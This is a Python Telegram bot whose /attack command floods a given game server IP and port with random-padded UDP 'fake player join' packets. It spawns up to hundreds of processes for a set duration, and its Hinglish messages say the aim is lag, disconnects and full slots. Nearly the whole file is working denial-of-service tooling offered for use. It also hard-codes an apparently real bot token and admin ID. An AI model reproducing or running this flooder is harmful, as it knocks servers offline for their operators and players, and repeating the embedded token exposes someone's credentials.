import logging
import socket
import time
import random
import multiprocessing as mp
import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# ==================== BOT CONFIG ====================
BOT_TOKEN = "7149714912:AAFDri0PhxEQoHtv3nW-YEq115PVeMVrLrI"
ADMIN_ID = 5879540185

stop_flags = {}
active_attacks = {}

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🔥 **Game Server Fake Players Flood Bot** Ready\nUse /attack to send fake requests.")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "⚔️ **Fake Players Attack**\n\n"
        "`/attack <game_server_ip> <game_port> <duration_seconds> <processes>`\n"
        "Example: `/attack 127.0.0.1 7777 60 200`\n\n"
        "→ Yeh fake UDP packets bhejega jo game server ko lag dega aur slots overload kar sakta hai.\n\n"
        "/stopattack\n/status",
        parse_mode='Markdown'
    )

def fake_player_worker(ip, port, duration, stop_event, worker_id):
    packets = 0
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 8 * 1024 * 1024)
        sock.setblocking(False)

        end_time = time.time() + duration
        
        # Game fake join jaisa payload (random bana diya taaki server process kare)
        base = f"FAKE_PLAYER_{worker_id}_JOIN_REQUEST_".encode()

        while time.time() < end_time and not stop_event.is_set():
            try:
                # Har packet mein thoda random data → server ko zyada processing lage
                payload = base + random.randbytes(random.randint(400, 900))
                sock.sendto(payload, (ip, port))
                packets += 1

                if packets % 2500 == 0:
                    time.sleep(0.00002)  # bahut chhota pause taaki buffer na bhare
            except BlockingIOError:
                time.sleep(0.0004)
            except:
                time.sleep(0.001)
        sock.close()
    except Exception as e:
        logger.error(f"Worker {worker_id} error: {e}")
    
    return packets

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("⛔ Unauthorized.")
        return

    if len(context.args) < 4:
        await update.message.reply_text(
            "Usage: `/attack <ip> <port> <duration> <processes>`\n"
            "Example: `/attack YOUR_GAME_SERVER_IP 7777 45 300`",
            parse_mode='Markdown'
        )
        return

    ip = context.args[0]
    port = int(context.args[1])
    duration = int(context.args[2])
    num_proc = int(context.args[3])   # jitna chahe daal (200-500 try kar pehle)

    attack_id = f"{ip}:{port}_{int(time.time())}"
    stop_event = mp.Event()
    stop_flags[attack_id] = stop_event

    msg = await update.message.reply_text(
        f"⚔️ **FAKE PLAYERS ATTACK STARTED**\n"
        f"🎯 Game Server: `{ip}:{port}`\n"
        f"⏱ Duration: `{duration}` seconds\n"
        f"🧵 Fake Processes: `{num_proc}`\n"
        f"📡 Sending fake join-like UDP packets...",
        parse_mode='Markdown'
    )

    processes = []
    for i in range(num_proc):
        p = mp.Process(target=fake_player_worker, args=(ip, port, duration, stop_event, i), daemon=True)
        p.start()
        processes.append(p)

    active_attacks[attack_id] = processes

    # Duration tak wait
    await asyncio.sleep(duration)

    stop_event.set()
    for p in processes:
        if p.is_alive():
            p.join(timeout=2)

    await msg.edit_text(
        f"✅ **Fake Attack Completed**\n"
        f"Game Server: `{ip}:{port}`\n"
        f"Duration: `{duration}s`\n"
        f"Fake processes used: `{num_proc}`\n\n"
        f"Ab dekh tere game server pe kya ho raha hai (lag, disconnects, slot full etc.)"
    )

async def stop_attack_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("⛔ Unauthorized.")
        return
    for ev in stop_flags.values():
        ev.set()
    await update.message.reply_text("🛑 All fake attacks stopped.")

def main():
    application = Application.builder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("stopattack", stop_attack_cmd))

    print("🔥 Fake Players UDP Bot Started!")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
